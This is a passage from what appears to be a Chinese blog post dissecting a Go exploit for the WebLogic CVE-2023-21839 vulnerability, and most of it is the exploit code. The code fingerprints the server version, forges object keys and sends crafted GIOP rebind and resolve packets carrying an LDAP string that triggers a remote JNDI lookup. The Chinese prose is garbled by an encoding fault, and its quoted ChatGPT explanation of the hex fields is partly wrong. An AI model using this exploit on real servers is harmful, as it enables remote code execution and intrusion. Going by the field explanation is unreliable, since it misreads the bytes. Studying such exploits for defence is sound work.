class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ver == <span class="string">&quot;14&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 14&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646&quot;</span> +</span><br><span class="line">			<span class="string">&quot;d696e53657276657200000000000000003349444c3a7765626c&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6769632f636f7262612f636f732f6e616d696e672f4e616d6&quot;</span> +</span><br><span class="line">			<span class="string">&quot;96e67436f6e74657874416e793a312e30000000000002380000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000014245412e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;200000000000000003349444c3a7765626c6f6769632f636f72&quot;</span> +</span><br><span class="line">			<span class="string">&quot;62612f636f732f6e616d696e672f4e616d696e67436f6e74657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;00000001424541&quot;</span> +</span><br><span class="line">			<span class="string">&quot;2e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[!] error and exit&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	host := hostConfig</span><br><span class="line">	port := portConfig</span><br><span class="line">	conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, host, port))</span><br><span class="line">	rmi := ldapConfig</span><br><span class="line">	<span class="comment">// [ldap len] [ldap string]</span></span><br><span class="line">	ldap := hex.EncodeToString([]<span class="type">byte</span>&#123;<span class="type">byte</span>(<span class="built_in">len</span>(rmi))&#125;)</span><br><span class="line">	ldap += hex.EncodeToString([]<span class="type">byte</span>(rmi))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	locateRequest := &amp;giop.LocateRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.LocateRequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:     giop.Int32(<span class="number">2</span>),</span><br><span class="line">		TargetAddress: giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:    giop.D(giop.NameService),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">2</span>, <span class="string">&quot;LocateRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(locateRequest.Bytes())</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	temp1 := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)</span><br><span class="line">	temp2 := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// GIOP Header</span></span><br><span class="line">	<span class="comment">// IOR Prefix</span></span><br><span class="line">	iOff := <span class="number">0x60</span></span><br><span class="line">	<span class="keyword">for</span> buf[iOff] != <span class="number">0x00</span> &#123;</span><br><span class="line">		<span class="comment">// ProfileHost</span></span><br><span class="line">		iOff++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> iOff &gt; <span class="number">1024</span>*<span class="number">10</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> buf[iOff] == <span class="number">0x00</span> &#123;</span><br><span class="line">		iOff++</span><br><span class="line">	&#125;</span><br><span class="line">	p := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">2</span>)</span><br><span class="line">	p[<span class="number">0</span>] = buf[iOff]</span><br><span class="line">	iOff++</span><br><span class="line">	p[<span class="number">1</span>] = buf[iOff]</span><br><span class="line"></span><br><span class="line">	tempPort := <span class="type">int</span>(binary.BigEndian.Uint16(p))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> tempPort != port &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	lt := iOff - <span class="number">0x60</span></span><br><span class="line">	fOff := <span class="number">0x60</span> + lt + <span class="number">0x75</span></span><br><span class="line">	<span class="comment">// other cases</span></span><br><span class="line">	<span class="keyword">for</span> buf[fOff] == <span class="number">0x00</span> &#123;</span><br><span class="line">		fOff++</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Fake ObjectKey1</span></span><br><span class="line">	<span class="built_in">copy</span>(temp1[<span class="number">0</span>:<span class="number">8</span>], buf[fOff:fOff+<span class="number">8</span>])</span><br><span class="line">	<span class="built_in">copy</span>(temp2[<span class="number">4</span>:<span class="number">8</span>], buf[fOff+<span class="number">4</span>:fOff+<span class="number">8</span>])</span><br><span class="line">	<span class="comment">// Fake ObjectKey2</span></span><br><span class="line">	<span class="built_in">copy</span>(temp2[<span class="number">0</span>:<span class="number">4</span>], []<span class="type">byte</span>&#123;<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>&#125;)</span><br><span class="line">	key1 = giop.E(temp1)</span><br><span class="line">	key2 = giop.E(temp2)</span><br><span class="line"></span><br><span class="line">	wlsKey1 = strings.ReplaceAll(wlsKey1, <span class="string">&quot;&#123;&#123;key1&#125;&#125;&quot;</span>, key1)</span><br><span class="line"></span><br><span class="line">	rebindAny := &amp;giop.RebindRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">3</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey1),</span><br><span class="line">		RequestOperation: giop.D(giop.RebindAnyOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">6</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;06&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data: giop.D(<span class="string">&quot;0000000000002849444c3a6f6d672e6f72672f53656e64696e67436&quot;</span> +</span><br><span class="line">						<span class="string">&quot;f6e746578742f436f6465426173653a312e30000000000100000000000000b8000102000000000&quot;</span> +</span><br><span class="line">						<span class="string">&quot;d3137322e32362e3131322e310000ec5b000000640042454108010300000000010000000000000&quot;</span> +</span><br><span class="line">						<span class="string">&quot;0000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f646542617&quot;</span> +</span><br><span class="line">						<span class="string">&quot;3653a312e30000000000331320000000000014245412a0000001000000000000000005eedafdeb&quot;</span> +</span><br><span class="line">						<span class="string">&quot;c0d227000000001000000010000002c00000000000100200000000300010020000100010501000&quot;</span> +</span><br><span class="line">						<span class="string">&quot;10001010000000003000101000001010905010001&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;0f&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000000000000000000100000000000000000100000000000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		StubData: giop.D(<span class="string">&quot;0000000000000001000000047465737400000001000000000000001d0000001c00000000000000010&quot;</span> +</span><br><span class="line">			<span class="string">&quot;0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384&quot;</span> +</span><br><span class="line">			<span class="string">&quot;13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242&quot;</span> +</span><br><span class="line">			<span class="string">&quot;412f57537472696e6756616c75653a312e300000000000&quot;</span> + ldap),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">3</span>, <span class="string">&quot;RebindRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(rebindAny.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	startOff := <span class="number">0x64</span> + lt + <span class="number">0xc0</span> + <span class="built_in">len</span>(host) + <span class="comment">// SendingContextRuntime</span></span><br><span class="line">		<span class="number">0xac</span> + lt + <span class="comment">// IOR ProfileHost ProfilePort</span></span><br><span class="line">		<span class="number">0x5d</span> <span class="comment">// ObjectKey Prefix</span></span><br><span class="line">	<span class="keyword">for</span> buf[startOff] != <span class="number">0x32</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> startOff &gt; <span class="number">0x2710</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// InternalKey Offset</span></span><br><span class="line">		startOff++</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> startOff &gt; <span class="number">0x2710</span> &#123;</span><br><span class="line">		key3 = giop.E([]<span class="type">byte</span>&#123;<span class="number">0x32</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x00</span>&#125;)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		key3 = giop.E(buf[startOff : startOff+<span class="number">4</span>])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wlsKey2 = strings.ReplaceAll(wlsKey2, <span class="string">&quot;&#123;&#123;key3&#125;&#125;&quot;</span>, key3)</span><br><span class="line">	wlsKey2 = strings.ReplaceAll(wlsKey2, <span class="string">&quot;&#123;&#123;key1&#125;&#125;&quot;</span>, key1)</span><br><span class="line"></span><br><span class="line">	rebindAnyTwice := &amp;giop.RebindRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">4</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey2),</span><br><span class="line">		RequestOperation: giop.D(giop.RebindAnyOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">4</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		StubData: giop.D(<span class="string">&quot;00000001000000047465737400000001000000000000001d0000001c00000000000000010&quot;</span> +</span><br><span class="line">			<span class="string">&quot;0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384&quot;</span> +</span><br><span class="line">			<span class="string">&quot;13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242&quot;</span> +</span><br><span class="line">			<span class="string">&quot;412f57537472696e6756616c75653a312e300000000000&quot;</span> + ldap),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">4</span>, <span class="string">&quot;RebindRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(rebindAnyTwice.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	locateRequest2 := &amp;giop.LocateRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.LocateRequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:     giop.Int32(<span class="number">5</span>),</span><br><span class="line">		TargetAddress: giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:    giop.D(giop.NameService),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">5</span>, <span class="string">&quot;LocateRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(locateRequest2.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	resolve := &amp;giop.ResolveRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">6</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey1),</span><br><span class="line">		RequestOperation: giop.D(giop.ResolveOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">4</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		CosNamingDissector: giop.D(<span class="string">&quot;00000000000000010000000574657374000000000000000100&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	giop.Log(<span class="number">6</span>, <span class="string">&quot;ResolveRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(resolve.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	resolveTwice := &amp;giop.ResolveRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">7</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey2),</span><br><span class="line">		RequestOperation: giop.D(giop.ResolveOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">4</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		CosNamingDissector: giop.D(<span class="string">&quot;00000000000000010000000574657374000000000000000100&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	giop.Log(<span class="number">7</span>, <span class="string">&quot;ResolveRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(resolveTwice.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	err = conn.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¼€å§‹çœ‹åˆ°è¿™ä¸ªè„šæœ¬è®©æˆ‘éå¸¸å›°æƒ‘ï¼Œå…¶ä¸­æœ€å¤šçš„å°±æ˜¯å¥‡å¥‡æ€ªæ€ªçš„æ•°å­—ï¼Œåé¢é—®äº†é—®chatgptæ‰çŸ¥é“</p>
<p>å¦‚</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">CosNamingDissector:</span> giop.D(<span class="string">&quot;00000000000000010000000574657374000000000000000100&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å®ƒè¡¨ç¤ºä¸€ä¸ªGIOPï¼ˆGeneral Inter-ORB Protocolï¼‰æ¶ˆæ¯çš„äºŒè¿›åˆ¶ç¼–ç ã€‚GIOPæ˜¯CORBAï¼ˆCommon Object Request Broker Architectureï¼‰è§„èŒƒä¸­å®šä¹‰çš„ä¸€ç§é€šä¿¡åè®®ï¼Œç”¨äºåœ¨åˆ†å¸ƒå¼å¯¹è±¡ç³»ç»Ÿä¸­è¿›è¡Œé€šä¿¡ã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ªå­—èŠ‚æ•°ç»„è¡¨ç¤ºä¸€ä¸ªGIOPæ¶ˆæ¯çš„å¤´éƒ¨ï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li>00000000 00000001ï¼šGIOPç‰ˆæœ¬å·ï¼Œè¿™é‡Œè¡¨ç¤ºç‰ˆæœ¬1.0</li>
<li>00000000 00000101ï¼šGIOPæ¶ˆæ¯æ ‡å¿—ï¼Œè¿™é‡Œè¡¨ç¤ºè¯·æ±‚æ¶ˆæ¯</li>
<li>74657374ï¼šGIOPæ¶ˆæ¯ç±»å‹ï¼Œè¿™é‡Œè¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²æ¶ˆæ¯</li>
<li>00000000 00000001ï¼šè¯·æ±‚æ¶ˆæ¯çš„æ ‡è¯†ç¬¦ï¼Œè¿™é‡Œä¸º1</li>
</ul>
</blockquote>
<p>è¯¥goè„šæœ¬æµç¨‹å¤§è‡´ä¸º</p>
<blockquote>
<ol>
<li>è§£æå‘½ä»¤è¡Œå‚æ•°ï¼ˆIPåœ°å€ã€ç«¯å£ã€LDAPå­—ç¬¦ä¸²ï¼‰</li>
<li>è·å–Weblogicç‰ˆæœ¬å·</li>
<li>æ ¹æ®Weblogicç‰ˆæœ¬å·è®¾ç½®å¯†é’¥</li>
<li>è¿æ¥åˆ°WeblogicæœåŠ¡å™¨</li>
<li>è®¾ç½®ServiceContext</li>
<li>æ„é€ æ¶æ„æ•°æ®åŒ…</li>
<li>å‘é€æ¶æ„æ•°æ®åŒ…</li>
<li>å…³é—­è¿æ¥</li>
</ol>
</blockquote>
<blockquote>
<p>ä»£ç ä¸­çš„ import è¯­å¥å¼•ç”¨äº†å››ä¸ªä¸åŒçš„åŒ…ï¼š</p>
<p><code>CVE-2023-21839</code><br><code>encoding/binary</code><br><code>encoding/hex</code><br><code>flag</code><br><code>fmt</code><br><code>net</code><br><code>strings</code><br>å…¶ä¸­ï¼Œ flag ç”¨äºè§£æå‘½ä»¤è¡Œå‚æ•°ã€‚ net ç”¨äºå¤„ç†ç½‘ç»œè¿æ¥ã€‚ strings ç”¨äºå­—ç¬¦ä¸²å¤„ç†ã€‚encoding&#x2F;hex ç”¨äºåå…­è¿›åˆ¶ç¼–ç &#x2F;è§£ç ï¼Œencoding&#x2F;binary ç”¨äºå¤„ç†äºŒè¿›åˆ¶æ•°æ®ã€‚</p>
</blockquote>
<blockquote>
<p>main() å‡½æ•°å¼€å§‹æ—¶è§£æå‘½ä»¤è¡Œå‚æ•°å¹¶æ‰“å°ç›¸åº”çš„æç¤ºä¿¡æ¯ã€‚ç„¶åè°ƒç”¨ <code>giop.GetVersion()</code> å‡½æ•°æ£€æµ‹ WebLogic æœåŠ¡å™¨çš„ç‰ˆæœ¬ã€‚åˆ†æå®Œç‰ˆæœ¬åç„¶åæ ¹æ® <code>WebLogic</code> ç‰ˆæœ¬é€‰æ‹©ä¸åŒçš„æ”»å‡»æ–¹å¼ï¼Œåˆ†åˆ«è®¾ç½®å˜é‡ <code>wlsKey1</code> å’Œ <code>wlsKey2</code>ï¼Œæœ€åä½¿ç”¨ <code>net.Dial()</code> å‡½æ•°å»ºç«‹ä¸ <code>WebLogic</code> æœåŠ¡å™¨çš„è¿æ¥ã€‚</p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> giop</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">D</span><span class="params">(str <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	data, _ := hex.DecodeString(str)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">E</span><span class="params">(b []<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> hex.EncodeToString(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Int32</span><span class="params">(i <span class="type">int</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4</span>)</span><br><span class="line">	binary.BigEndian.PutUint32(b, <span class="type">uint32</span>(i))</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ç”±äºè¯¥æ¼æ´çš„å½±å“èŒƒå›´ä¸º<code>Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</code>ï¼Œæ‰€ä»¥è¯¥ä»£ç å…ˆè¿›è¡Œäº†ç½‘ç«™<code>weblogic</code>ç‰ˆæœ¬æ£€æµ‹ï¼Œå¦‚æœä¸æ˜¯12æˆ–14ç‰ˆæœ¬åˆ™è¿›è¡Œæµ‹è¯•ï¼Œå¦åˆ™ç»“æŸ</p>
<blockquote>
<p>WebLogic Serverä½¿ç”¨WLS Keyæ¥åŠ å¯†å’Œè§£å¯†æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚å¯†ç å’Œè¯ä¹¦ç§é’¥</p>
<p>WLS Keyæ˜¯ç”±WebLogic Serverç”Ÿæˆå¹¶ç®¡ç†çš„ï¼Œå®ƒä¸æ˜¯ç”±ç®¡ç†å‘˜æ‰‹åŠ¨è®¾ç½®çš„ï¼Œä¹Ÿä¸æ˜¯ç³»ç»Ÿé»˜è®¤çš„ã€‚åœ¨WebLogic Serverå¯åŠ¨æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªWLS Keyï¼Œå¹¶ä½¿ç”¨è¯¥å¯†é’¥æ¥åŠ å¯†å’Œè§£å¯†å­˜å‚¨åœ¨WebLogic Serverä¸­çš„æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚å¯†ç å’Œè¯ä¹¦ç§é’¥ã€‚</p>
<p>WebLogic Serverç”Ÿæˆçš„WLS Keyæ˜¯æ¯ä¸ªå®ä¾‹å”¯ä¸€çš„ï¼Œæ¯ä¸ªå®ä¾‹éƒ½æœ‰è‡ªå·±çš„WLS Keyã€‚è¿™æ˜¯å› ä¸ºWLS Keyæ˜¯é€šè¿‡ä½¿ç”¨ç‰¹å®šäºWebLogic Serverå®ä¾‹çš„ä¿¡æ¯ç”Ÿæˆçš„</p>
</blockquote>
<p>æ‰€ä»¥åœ¨ä¸‹é¢çš„ä»£ç ä¸­wlsä½œç”¨</p>
